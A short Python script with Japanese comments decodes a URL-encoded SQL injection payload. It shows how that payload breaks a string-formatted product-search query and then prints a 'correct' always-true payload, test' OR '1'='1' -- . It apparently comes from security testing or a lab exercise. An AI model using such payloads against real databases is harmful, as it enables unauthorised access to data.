import urllib.parse

# URLデコードして実際のペイロードを確認
payload = "%E3%83%91%E3%82%BD'%20and%20'A'='A'%20--%20"
decoded = urllib.parse.unquote(payload)
print(f"デコード結果: {repr(decoded)}")
print(f"実際のSQL: パソ' and 'A'='A' -- ")

# 実際のSQLクエリがどうなるか確認
query_template = "SELECT id, name, description, price, stock, category, image_url FROM products WHERE name LIKE '%{query}%' OR description LIKE '%{query}%'"
actual_sql = query_template.format(query=decoded)
print(f"\n実際に実行されるSQL:")
print(actual_sql)

print(f"\n問題の分析:")
print("1. LIKE '%パソ' and 'A'='A' -- %' ← この構造が問題")
print("2. シングルクォートが閉じられていない")
print("3. SQLコメント(--) の後に %' が残っている")

print(f"\n正しいペイロード例:")
correct_payload = "test' OR '1'='1' -- "
correct_sql = query_template.format(query=correct_payload)
print(f"ペイロード: {correct_payload}")
print(f"SQL: {correct_sql}")